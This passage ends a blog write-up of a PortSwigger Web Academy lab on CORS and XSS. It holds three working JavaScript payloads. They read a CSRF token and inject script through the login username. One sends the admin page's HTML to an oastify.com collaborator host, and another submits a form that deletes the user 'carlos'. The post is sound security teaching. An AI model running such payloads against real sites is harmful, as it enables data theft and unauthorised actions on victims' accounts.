	<span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/login?time=</span><span class="dl">'</span><span class="o">+</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;username=</span><span class="dl">'</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">vector</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;password=test&amp;csrf=</span><span class="dl">'</span><span class="o">+</span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/csrf" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">collaboratorURL</span><span class="p">){</span>
	<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">text</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="dl">'</span><span class="s1">"&gt;&lt;img src=</span><span class="dl">'</span><span class="o">+</span><span class="nx">collaboratorURL</span><span class="o">+</span><span class="dl">'</span><span class="s1">?foundXSS=1&gt;</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}))</span>
<span class="p">}</span>

<span class="nx">fetchUrl</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://192.168.0.145:8080</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://547jg7jjlja7886t5crnkxt2xt3krcf1.oastify.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/images/6811aa54aa97f4aed9c6a4fa2bae215d3c80a1df8bbb5b14275a3bcc685b4503.png" alt="picture 10" data-proofer-ignore></p><p>Next payload should leak the admin page.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="nx">vector</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/login?time=</span><span class="dl">'</span><span class="o">+</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;username=</span><span class="dl">'</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">vector</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;password=test&amp;csrf=</span><span class="dl">'</span><span class="o">+</span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/csrf" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">collaboratorURL</span><span class="p">){</span>
	<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="o">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">text</span><span class="o">=&gt;</span>
	<span class="p">{</span>
		<span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="dl">'</span><span class="s1">"&gt;&lt;iframe src=/admin onload="new Image().src=</span><span class="se">\'</span><span class="dl">'</span><span class="o">+</span><span class="nx">collaboratorURL</span><span class="o">+</span><span class="dl">'</span><span class="s1">?code=</span><span class="se">\'</span><span class="s1">+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="p">))</span>
<span class="p">}</span>

<span class="nx">fetchUrl</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://192.168.0.145:8080</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://2rug346g8gx4v5tqs9ek7ugzkqqhea2z.oastify.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>We get a callback</p><p><img data-src="/assets/images/ff792becc7d8ba2eb4fdd6dc53e5365790ad2acdc2877a7d3e23fd48807b788d.png" alt="picture 11" data-proofer-ignore></p><p>In order to delete <code class="language-plaintext highlighter-rouge">carlos</code> we need to submit a form (including CSRF value).</p><p>Next payload will do exactly that.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="nx">vector</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/login?time=</span><span class="dl">'</span><span class="o">+</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;username=</span><span class="dl">'</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">vector</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;password=test&amp;csrf=</span><span class="dl">'</span><span class="o">+</span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/csrf" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">){</span>
	<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="o">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">text</span><span class="o">=&gt;</span>
	<span class="p">{</span>
	<span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="dl">'</span><span class="s1">"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=</span><span class="se">\'</span><span class="s1">carlos</span><span class="se">\'</span><span class="s1">,f.submit()"&gt;</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="p">))</span>
<span class="p">}</span>

<span class="nx">fetchUrl</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://192.168.0.145:8080</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>We’re now not expecting a callback but <code class="language-plaintext highlighter-rouge">Congratulations, you solved the lab!</code> message!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/cross-origin-resource-sharing/'>Cross-Origin Resource Sharing</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/CORS/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS) - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/CORS/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/CORS/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Blind_SQL_Injection/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blind SQL Injection</h3><div class="text-muted small"><p> Intro Lab at portswigger: Blind SQL Injection TOC Intro TOC Blind SQL injection with conditional responses Intro Finding the SQL Injection Database Enumeration ...</p></div></div></a></div><div class="card"> <a href="/posts/Alternative_vulnerable_authentication_mechanismus/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Other vulnerable Authentication Mechanismus</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Multi_Factor_Authentication/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Multi-Factor Authentication (MFA)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CSRF/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)</p></a> <a href="/posts/crAPI_writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Vulnerable Lab by OWASP - crAPI (Writeup)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
